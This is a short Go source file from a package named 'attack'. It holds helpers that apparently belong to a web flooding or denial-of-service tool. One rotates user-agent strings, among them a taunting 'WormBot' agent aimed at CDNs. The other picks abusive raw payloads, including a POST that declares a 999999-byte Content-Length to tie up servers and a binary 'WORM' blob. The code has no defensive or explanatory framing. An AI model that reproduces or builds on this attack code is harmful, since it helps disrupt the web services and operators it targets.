package attack

import (
	"math/rand"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func RandomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
		"WormBot/1.0 (FuckYourCDN)",
	}
	return uas[rand.Intn(len(uas))]
}

func GenPayload() []byte {
	payloads := [][]byte{
		[]byte("GET / HTTP/1.1\r\nHost: fuckyou\r\n\r\n"),
		[]byte("POST / HTTP/1.1\r\nContent-Length: 999999\r\n\r\n"),
		[]byte("X\x00\x00\x00WORM\r\n"),
	}
	return payloads[rand.Intn(len(payloads))]
}
